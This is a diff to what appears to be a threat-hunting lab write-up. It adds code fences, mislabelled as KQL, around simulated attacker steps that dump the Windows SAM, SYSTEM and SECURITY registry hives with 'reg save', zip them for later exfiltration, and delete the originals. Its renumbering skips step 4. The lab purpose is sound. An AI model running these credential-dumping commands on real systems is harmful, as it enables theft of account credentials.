@@ -4,13 +4,17 @@
 ## Steps the "Bad Actor" took Create Logs and IoCs:
 1. Open an elevated command prompt (run as administrator).
 2. Use built-in reg save command to dump sensitive hives:
+```kql
 reg save HKLM\SAM C:\Users\Public\SAM.save
 reg save HKLM\SYSTEM C:\Users\Public\SYSTEM.save
 reg save HKLM\SECURITY C:\Users\Public\SECURITY.save
+```
 3. Compress all dumped files into hashes.zip:
+```kql
 powershell Compress-Archive -Path C:\Users\Public\SAM.save, C:\Users\Public\SYSTEM.save, C:\Users\Public\SECURITY.save -DestinationPath C:\Users\Public\hashes.zip
-4. Delete original .save files to reduce footprint.
-5. Leave hashes.zip in the folder for later retrieval or exfiltration.
+```
+5. Delete original .save files to reduce footprint.
+6. Leave hashes.zip in the folder for later retrieval or exfiltration.
 
 ---
 
